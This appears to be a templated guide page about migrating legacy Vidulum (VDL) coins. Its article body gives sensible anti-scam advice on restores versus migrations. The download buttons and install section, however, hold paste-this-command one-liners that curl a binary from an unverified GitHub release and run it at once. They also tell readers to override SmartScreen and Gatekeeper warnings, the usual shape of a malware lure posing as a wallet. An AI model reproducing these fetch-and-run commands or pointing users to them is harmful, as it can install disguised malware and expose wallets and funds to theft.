![Vidulum](../assets/banner-article.png)

# Vidulum Coin Migration: Moving Legacy VDL Into the Current Wallet

Restoring access is not migrating an asset - and confusing them is expensive.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

Use the [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) for anything you do after reading this page.

> A restore recovers old keys. A migration changes what an asset is. Only one of them is reversible.

Two different jobs get called "migration": rebuilding access to VDL you already own, and converting a legacy balance into the current asset. The first is a restore. The second is a project-level process with rules, and this page does not have them. What it can do is keep you from treating one as the other while you wait for the real instructions.

<!-- ARTICLE-BODY-BEGIN -->

## The distinction that matters

If your VDL sits at an address that a phrase or private key still controls, nothing needs converting. Restore, confirm the address, and the balance is there. That is a restore, and it is complete on its own.

A migration is different: it moves value from an old representation to a new one, usually because a chain or contract changed. It creates a transaction, has a deadline or a supported route, and cannot be undone by restoring again. Mixing the two leads to the expensive mistake: converting an asset you did not need to convert, or waiting for a migration process when a simple restore would have shown you the coins.

## What a legitimate migration never requires

- Your recovery phrase, sent to anyone.
- A remote session where someone watches you restore.
- A "gas fee" paid to an individual.
- A countdown that closes if you do not act tonight.
- A link from a chat message, rather than the project's own channel.

The first four are the standard shape of a migration scam, because a real process runs on-chain or in software you installed, not in a conversation.

## Before you move anything

1. Establish what you actually hold and where, from the address rather than from memory.
2. Confirm the balance on an explorer for the chain it sits on.
3. Find the project's own instructions for the conversion, with a date and a named owner.
4. Ask support which route applies to your balance before sending anything.
5. Keep the old install or its keys until the new balance is confirmed.

Steps one to three cost nothing and prevent most losses. Step five is the one people skip.

## When to stop and ask

Stop if the instructions you found are undated, if they come from a third party, if the first step involves moving coins to an address someone gave you, or if nobody can tell you what happens to the old balance afterwards.

Stop is a real answer here. A migration can be completed later; a wrong transfer cannot be undone.

A restore is covered in the <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md">Vidulum Wallet recovery phrase restore</a> page, which also sets out the single-key route.

## Verifying the result

After any conversion, confirm the new balance on-chain before assuming success, and keep the record of what you sent and when. If the old balance is gone and the new one is absent, do not repeat the process: gather the transaction details and take them to support.

The narrower key route is in <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-private-key-export-one-address.md">Vidulum Wallet private key export</a>, which is per address and per coin.

Check what you are holding against the <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-download-windows-macos-linux.md">Vidulum Wallet download for Windows, macOS and Linux</a> page before converting anything.

Use the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> for any step after this page.

## FAQ

### Do I need to migrate my VDL?

Only if the project says the representation changed. If your balance is at an address you control, start with a restore instead.

### Can I migrate by restoring my phrase?

No. Restoring reopens addresses; it does not convert an asset.

### Is there an official migration page?

The material behind this page does not document the current procedure, so this page does not publish steps or links for it. Ask the project directly.

### Someone offered to migrate it for me. Should I accept?

No. A process that needs a stranger with your keys is not a process.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[Restore from a phrase](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md) - [Private key export](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-private-key-export-one-address.md) - [Wallet download](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-download-windows-macos-linux.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
